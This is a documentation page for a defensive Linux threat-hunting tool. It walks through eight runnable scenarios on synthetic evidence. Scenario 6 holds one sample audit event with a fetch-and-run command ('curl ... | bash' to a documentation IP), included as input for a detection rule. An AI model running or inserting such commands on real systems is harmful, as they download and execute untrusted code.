# Examples: runnable synthetic scenarios

All scenarios use the invented data in `examples/`. Documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and `.example`/`.test` names are used on purpose. Run commands from the `linux-threat-hunter` directory. See [walkthrough](walkthrough.md) for the guided version.

| Path | Contents |
|---|---|
| `examples/synthetic-baseline-evidence/` | a clean synthetic host (`lab-host-01`) |
| `examples/synthetic-evidence/` | the same host after a synthetic incident (new service/timer/cron, suspicious process, failed-then-successful logins, changed files) |
| `examples/iocs.json` | synthetic indicators |
| `examples/baselines/clean-baseline.json` | baseline created from the clean evidence |
| `examples/configs/` | `auth-threshold-3.yaml`, `allowlist-appimage.yaml` |
| `examples/expected-results/expected-findings.json` | finding counts per rule for the full run (checked by a test) |

## Scenario 1: everything at once

```bash
bash scripts/run-demo.sh
```

## Scenario 2: process and persistence only (no IOCs, no baseline)

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --output ./results --show 30
```

IOC and baseline rules are listed as skipped (with reasons) in `results/results.json`.

## Scenario 3: IOC matching

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --iocs examples/iocs.json --output ./results
python -m linux_threat_hunter show --input ./results --severity high
```

## Scenario 4: baseline drift

```bash
python -m linux_threat_hunter baseline compare --input examples/synthetic-evidence --baseline examples/baselines/clean-baseline.json
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --baseline examples/baselines/clean-baseline.json --output ./results
```

## Scenario 5: authentication thresholds

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --config examples/configs/auth-threshold-3.yaml --output ./results
```

## Scenario 6: imported command events

Evidence can include `events.json`, a list of command events exported from your own audit pipeline:

```json
[
  {"timestamp": "2025-10-14T03:15:10Z", "source": "shell-audit", "user": "deploy",
   "command": "curl -s http://198.51.100.7/x.sh | bash"}
]
```

`timestamp` must be ISO-8601 **with an offset** (events without one are not time-correlated). Rule `LTH-PROC-006` evaluates `command` with the configurable `suspicious_command_patterns`.

## Scenario 7: fail a pipeline on high severity

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --iocs examples/iocs.json --output ./results --fail-on high
echo "exit code: $?"      # 3 when a finding is at or above the threshold
```

## Scenario 8: write your own evidence

Create a directory with a `manifest.json` (`{"collected_at": "2025-10-14T09:00:00Z", "timezone": "UTC"}`) and any of `processes.json`, `persistence.json`, `network.json`, `files.json`, `events.json`, `auth.log`. Record fields are listed in [rule-authoring](rule-authoring.md#record-fields-by-data-source). Missing files simply skip the rules that need them.
